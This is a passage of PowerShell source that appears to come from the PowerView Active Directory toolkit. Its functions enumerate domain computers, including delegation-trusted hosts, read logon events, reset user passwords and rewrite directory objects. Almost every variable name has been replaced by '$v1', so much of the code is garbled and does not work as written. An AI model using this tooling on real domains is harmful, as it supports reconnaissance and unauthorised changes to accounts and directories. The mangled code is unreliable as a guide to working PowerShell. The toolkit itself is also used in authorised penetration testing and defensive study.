                Write-Verbose "[Set-DomainUserPassword] Password for user '$v1' successfully reset"
            }
            catch {
                Write-Warning "[Set-DomainUserPassword] Error setting password for user '$v1' : $v1"
            }
        }
        else {
            Write-Warning "[Set-DomainUserPassword] Unable to find user '$v1'"
        }
    }
}


function Get-DomainUserEvent {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.LogonEvent')]
    [OutputType('PowerView.ExplicitCredentialLogonEvent')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('dnshostname', 'HostName', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = $v1:COMPUTERNAME,

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1 = [DateTime]::Now.AddDays(-1),

        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1 = [DateTime]::Now,

        [ValidateRange(1, 1000000)]
        [Int]
        $v1 = 5000,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        $v1 = @"
<QueryList>
    <Query Id="0" Path="Security">

        <!-- Logon events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4624)
                    and TimeCreated[
                        @SystemTime&gt;='$($v1.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($v1.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
            and
            *[EventData[Data[@Name='TargetUserName'] != 'ANONYMOUS LOGON']]
        </Select>

        <!-- Logon with explicit credential events -->
        <Select Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and (Level=4 or Level=0) and (EventID=4648)
                    and TimeCreated[
                        @SystemTime&gt;='$($v1.ToUniversalTime().ToString('s'))' and @SystemTime&lt;='$($v1.ToUniversalTime().ToString('s'))'
                    ]
                ]
            ]
        </Select>

        <Suppress Path="Security">
            *[
                System[
                    Provider[
                        @Name='Microsoft-Windows-Security-Auditing'
                    ]
                    and
                    (Level=4 or Level=0) and (EventID=4624 or EventID=4625 or EventID=4634)
                ]
            ]
            and
            *[
                EventData[
                    (
                        (Data[@Name='LogonType']='5' or Data[@Name='LogonType']='0')
                        or
                        Data[@Name='TargetUserName']='ANONYMOUS LOGON'
                        or
                        Data[@Name='TargetUserSID']='S-1-5-18'
                    )
                ]
            ]
        </Suppress>
    </Query>
</QueryList>
"@
        $v1 = @{
            'FilterXPath' = $v1
            'LogName' = 'Security'
            'MaxEvents' = $v1
        }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        ForEach ($v1 in $v1) {

            $v1['ComputerName'] = $v1

            Get-WinEvent @EventArguments| ForEach-Object {
                $v1 = $v1
                $v1 = $v1.Properties
                Switch ($v1.Id) {

                    4624 {

                        if(-not $v1[5].Value.EndsWith('$')) {
                            $v1 = New-Object PSObject -Property @{
                                ComputerName              = $v1
                                TimeCreated               = $v1.TimeCreated
                                EventId                   = $v1.Id
                                SubjectUserSid            = $v1[0].Value.ToString()
                                SubjectUserName           = $v1[1].Value
                                SubjectDomainName         = $v1[2].Value
                                SubjectLogonId            = $v1[3].Value
                                TargetUserSid             = $v1[4].Value.ToString()
                                TargetUserName            = $v1[5].Value
                                TargetDomainName          = $v1[6].Value
                                TargetLogonId             = $v1[7].Value
                                LogonType                 = $v1[8].Value
                                LogonProcessName          = $v1[9].Value
                                AuthenticationPackageName = $v1[10].Value
                                WorkstationName           = $v1[11].Value
                                LogonGuid                 = $v1[12].Value
                                TransmittedServices       = $v1[13].Value
                                LmPackageName             = $v1[14].Value
                                KeyLength                 = $v1[15].Value
                                ProcessId                 = $v1[16].Value
                                ProcessName               = $v1[17].Value
                                IpAddress                 = $v1[18].Value
                                IpPort                    = $v1[19].Value
                                ImpersonationLevel        = $v1[20].Value
                                RestrictedAdminMode       = $v1[21].Value
                                TargetOutboundUserName    = $v1[22].Value
                                TargetOutboundDomainName  = $v1[23].Value
                                VirtualAccount            = $v1[24].Value
                                TargetLinkedLogonId       = $v1[25].Value
                                ElevatedToken             = $v1[26].Value
                            }
                            $v1.PSObject.TypeNames.Insert(0, 'PowerView.LogonEvent')
                            $v1
                        }
                    }


                    4648 {

                        if((-not $v1[5].Value.EndsWith('$')) -and ($v1[11].Value -match 'taskhost\.exe')) {
                            $v1 = New-Object PSObject -Property @{
                                ComputerName              = $v1
                                TimeCreated       = $v1.TimeCreated
                                EventId           = $v1.Id
                                SubjectUserSid    = $v1[0].Value.ToString()
                                SubjectUserName   = $v1[1].Value
                                SubjectDomainName = $v1[2].Value
                                SubjectLogonId    = $v1[3].Value
                                LogonGuid         = $v1[4].Value.ToString()
                                TargetUserName    = $v1[5].Value
                                TargetDomainName  = $v1[6].Value
                                TargetLogonGuid   = $v1[7].Value
                                TargetServerName  = $v1[8].Value
                                TargetInfo        = $v1[9].Value
                                ProcessId         = $v1[10].Value
                                ProcessName       = $v1[11].Value
                                IpAddress         = $v1[12].Value
                                IpPort            = $v1[13].Value
                            }
                            $v1.PSObject.TypeNames.Insert(0, 'PowerView.ExplicitCredentialLogonEvent')
                            $v1
                        }
                    }
                    default {
                        Write-Warning "No handler exists for event ID: $($v1.Id)"
                    }
                }
            }
        }
    }
}


function Get-DomainGUIDMap {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    $v1 = @{'00000000-0000-0000-0000-000000000000' = 'All'}

    $v1 = @{}
    if ($v1['Credential']) { $v1['Credential'] = $v1 }

    try {
        $v1 = (Get-Forest @ForestArguments).schema.name
    }
    catch {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }
    if (-not $v1) {
        throw '[Get-DomainGUIDMap] Error in retrieving forest schema path from Get-Forest'
    }

    $v1 = @{
        'SearchBase' = $v1
        'LDAPFilter' = '(schemaIDGUID=*)'
    }
    if ($v1['Domain']) { $v1['Domain'] = $v1 }
    if ($v1['Server']) { $v1['Server'] = $v1 }
    if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
    if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
    if ($v1['Credential']) { $v1['Credential'] = $v1 }
    $v1 = Get-DomainSearcher @SearcherArguments

    if ($v1) {
        try {
            $v1 = $v1.FindAll()
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1[(New-Object Guid (,$v1.properties.schemaidguid[0])).Guid] = $v1.properties.name[0]
            }
            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $v1"
        }
    }

    $v1['SearchBase'] = $v1.replace('Schema','Extended-Rights')
    $v1['LDAPFilter'] = '(objectClass=controlAccessRight)'
    $v1 = Get-DomainSearcher @SearcherArguments

    if ($v1) {
        try {
            $v1 = $v1.FindAll()
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1[$v1.properties.rightsguid[0].toString()] = $v1.properties.name[0]
            }
            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainGUIDMap] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }
        catch {
            Write-Verbose "[Get-DomainGUIDMap] Error in building GUID map: $v1"
        }
    }

    $v1
}


function Get-DomainComputer {

    [OutputType('PowerView.Computer')]
    [OutputType('PowerView.Computer.Raw')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('SamAccountName', 'Name', 'DNSHostName')]
        [String[]]
        $v1,

        [Switch]
        $v1,

        [Switch]
        $v1,

        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePrincipalName')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    DynamicParam {
        $v1 = [Enum]::GetNames($v1)

        $v1 = $v1 | ForEach-Object {$v1; "NOT_$v1"}

        New-DynamicParameter -Name UACFilter -ValidateSet $v1 -Type ([array])
    }

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {

        if ($v1 -and ($v1.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $v1
        }

        if ($v1) {
            $v1 = ''
            $v1 = ''
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                if ($v1 -match '^S-1-') {
                    $v1 += "(objectsid=$v1)"
                }
                elseif ($v1 -match '^CN=') {
                    $v1 += "(distinguishedname=$v1)"
                    if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                        $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$v1' from '$v1'"
                        $v1['Domain'] = $v1
                        $v1 = Get-DomainSearcher @SearcherArguments
                        if (-not $v1) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$v1'"
                        }
                    }
                }
                elseif ($v1.Contains('.')) {
                    $v1 += "(|(name=$v1)(dnshostname=$v1))"
                }
                elseif ($v1 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $v1 = (([Guid]$v1).ToByteArray() | ForEach-Object { '\' + $v1.ToString('X2') }) -join ''
                    $v1 += "(objectguid=$v1)"
                }
                else {
                    $v1 += "(name=$v1)"
                }
            }
            if ($v1 -and ($v1.Trim() -ne '') ) {
                $v1 += "(|$v1)"
            }

            if ($v1['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $v1 += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($v1['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $v1 += '(msds-allowedtodelegateto=*)'
            }
            if ($v1['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $v1 += '(objectCategory=printQueue)'
            }
            if ($v1['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $v1"
                $v1 += "(servicePrincipalName=$v1)"
            }
            if ($v1['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $v1"
                $v1 += "(operatingsystem=$v1)"
            }
            if ($v1['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $v1"
                $v1 += "(operatingsystemservicepack=$v1)"
            }
            if ($v1['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $v1"
                $v1 += "(serverreferencebl=$v1)"
            }
            if ($v1['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $v1"
                $v1 += "$v1"
            }

            $v1 | Where-Object {$v1} | ForEach-Object {
                if ($v1 -match 'NOT_.*') {
                    $v1 = $v1.Substring(4)
                    $v1 = [Int]($v1::$v1)
                    $v1 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$v1))"
                }
                else {
                    $v1 = [Int]($v1::$v1)
                    $v1 += "(userAccountControl:1.2.840.113556.1.4.803:=$v1)"
                }
            }

            $v1.filter = "(&(samAccountType=805306369)$v1)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($v1.filter)"

            if ($v1['FindOne']) { $v1 = $v1.FindOne() }
            else { $v1 = $v1.FindAll() }
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1
                if ($v1['Ping']) {
                    $v1 = Test-Connection -Count 1 -Quiet -ComputerName $v1.properties.dnshostname
                }
                if ($v1) {
                    if ($v1['Raw']) {

                        $v1 = $v1
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $v1 = Convert-LDAPProperty -Properties $v1.Properties
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $v1
                }
            }
            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }
    }
}


function Get-DomainObject {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    DynamicParam {
        $v1 = [Enum]::GetNames($v1)

        $v1 = $v1 | ForEach-Object {$v1; "NOT_$v1"}

        New-DynamicParameter -Name UACFilter -ValidateSet $v1 -Type ([array])
    }

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {

        if ($v1 -and ($v1.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $v1
        }
        if ($v1) {
            $v1 = ''
            $v1 = ''
            $v1 | Where-Object {$v1} | ForEach-Object {
                $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                if ($v1 -match '^S-1-') {
                    $v1 += "(objectsid=$v1)"
                }
                elseif ($v1 -match '^(CN|OU|DC)=') {
                    $v1 += "(distinguishedname=$v1)"
                    if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                        $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObject] Extracted domain '$v1' from '$v1'"
                        $v1['Domain'] = $v1
                        $v1 = Get-DomainSearcher @SearcherArguments
                        if (-not $v1) {
                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$v1'"
                        }
                    }
                }
                elseif ($v1 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $v1 = (([Guid]$v1).ToByteArray() | ForEach-Object { '\' + $v1.ToString('X2') }) -join ''
                    $v1 += "(objectguid=$v1)"
                }
                elseif ($v1.Contains('\')) {
                    $v1 = $v1.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($v1) {
                        $v1 = $v1.SubString(0, $v1.IndexOf('/'))
                        $v1 = $v1.Split('\')[1]
                        $v1 += "(samAccountName=$v1)"
                        $v1['Domain'] = $v1
                        Write-Verbose "[Get-DomainObject] Extracted domain '$v1' from '$v1'"
                        $v1 = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($v1.Contains('.')) {
                    $v1 += "(|(samAccountName=$v1)(name=$v1)(dnshostname=$v1))"
                }
                else {
                    $v1 += "(|(samAccountName=$v1)(name=$v1)(displayname=$v1))"
                }
            }
            if ($v1 -and ($v1.Trim() -ne '') ) {
                $v1 += "(|$v1)"
            }

            if ($v1['LDAPFilter']) {
                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $v1"
                $v1 += "$v1"
            }


            $v1 | Where-Object {$v1} | ForEach-Object {
                if ($v1 -match 'NOT_.*') {
                    $v1 = $v1.Substring(4)
                    $v1 = [Int]($v1::$v1)
                    $v1 += "(!(userAccountControl:1.2.840.113556.1.4.803:=$v1))"
                }
                else {
                    $v1 = [Int]($v1::$v1)
                    $v1 += "(userAccountControl:1.2.840.113556.1.4.803:=$v1)"
                }
            }

            if ($v1 -and $v1 -ne '') {
                $v1.filter = "(&$v1)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($v1.filter)"

            if ($v1['FindOne']) { $v1 = $v1.FindOne() }
            else { $v1 = $v1.FindAll() }
            $v1 | Where-Object {$v1} | ForEach-Object {
                if ($v1['Raw']) {

                    $v1 = $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $v1 = Convert-LDAPProperty -Properties $v1.Properties
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $v1
            }
            if ($v1) {
                try { $v1.dispose() }
                catch {
                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $v1"
                }
            }
            $v1.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{
            'Properties'    =   'msds-replattributemetadata','distinguishedname'
            'Raw'           =   $v1
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['FindOne']) { $v1['FindOne'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['Properties']) {
            $v1 = $v1['Properties'] -Join '|'
        }
        else {
            $v1 = ''
        }
    }

    PROCESS {
        if ($v1['Identity']) { $v1['Identity'] = $v1 }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $v1 = $v1.Properties['distinguishedname'][0]
            ForEach($v1 in $v1.Properties['msds-replattributemetadata']) {
                $v1 = [xml]$v1 | Select-Object -ExpandProperty 'DS_REPL_ATTR_META_DATA' -ErrorAction SilentlyContinue
                if ($v1) {
                    if ($v1.pszAttributeName -Match $v1) {
                        $v1 = New-Object PSObject
                        $v1 | Add-Member NoteProperty 'ObjectDN' $v1
                        $v1 | Add-Member NoteProperty 'AttributeName' $v1.pszAttributeName
                        $v1 | Add-Member NoteProperty 'LastOriginatingChange' $v1.ftimeLastOriginatingChange
                        $v1 | Add-Member NoteProperty 'Version' $v1.dwVersion
                        $v1 | Add-Member NoteProperty 'LastOriginatingDsaDN' $v1.pszLastOriginatingDsaDN
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectAttributeHistory')
                        $v1
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectAttributeHistory] Error retrieving 'msds-replattributemetadata' for '$v1'"
                }
            }
        }
    }
}


function Get-DomainObjectLinkedAttributeHistory {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObjectLinkedAttributeHistory')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{
            'Properties'    =   'msds-replvaluemetadata','distinguishedname'
            'Raw'           =   $v1
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        if ($v1['Properties']) {
            $v1 = $v1['Properties'] -Join '|'
        }
        else {
            $v1 = ''
        }
    }

    PROCESS {
        if ($v1['Identity']) { $v1['Identity'] = $v1 }

        Get-DomainObject @SearcherArguments | ForEach-Object {
            $v1 = $v1.Properties['distinguishedname'][0]
            ForEach($v1 in $v1.Properties['msds-replvaluemetadata']) {
                $v1 = [xml]$v1 | Select-Object -ExpandProperty 'DS_REPL_VALUE_META_DATA' -ErrorAction SilentlyContinue
                if ($v1) {
                    if ($v1.pszAttributeName -Match $v1) {
                        $v1 = New-Object PSObject
                        $v1 | Add-Member NoteProperty 'ObjectDN' $v1
                        $v1 | Add-Member NoteProperty 'AttributeName' $v1.pszAttributeName
                        $v1 | Add-Member NoteProperty 'AttributeValue' $v1.pszObjectDn
                        $v1 | Add-Member NoteProperty 'TimeCreated' $v1.ftimeCreated
                        $v1 | Add-Member NoteProperty 'TimeDeleted' $v1.ftimeDeleted
                        $v1 | Add-Member NoteProperty 'LastOriginatingChange' $v1.ftimeLastOriginatingChange
                        $v1 | Add-Member NoteProperty 'Version' $v1.dwVersion
                        $v1 | Add-Member NoteProperty 'LastOriginatingDsaDN' $v1.pszLastOriginatingDsaDN
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.ADObjectLinkedAttributeHistory')
                        $v1
                    }
                }
                else {
                    Write-Verbose "[Get-DomainObjectLinkedAttributeHistory] Error retrieving 'msds-replvaluemetadata' for '$v1'"
                }
            }
        }
    }
}


function Set-DomainObject {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Replace')]
        [Hashtable]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{'Raw' = $v1}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        if ($v1['Identity']) { $v1['Identity'] = $v1 }


        $v1 = Get-DomainObject @SearcherArguments

        ForEach ($v1 in $v1) {

            $v1 = $v1.GetDirectoryEntry()

            if($v1['Set']) {
                try {
                    $v1['Set'].GetEnumerator() | ForEach-Object {
                        Write-Verbose "[Set-DomainObject] Setting '$($v1.Name)' to '$($v1.Value)' for object '$($v1.Properties.samaccountname)'"
                        $v1.put($v1.Name, $v1.Value)
                    }
                    $v1.commitchanges()
                }
                catch {
                    Write-Warning "[Set-DomainObject] Error setting/replacing properties for object '$($v1.Properties.samaccountname)' : $v1"
                }
            }
            if($v1['XOR']) {
                try {
                    $v1['XOR'].GetEnumerator() | ForEach-Object {
                        $v1 = $v1.Name
                        $v1 = $v1.Value
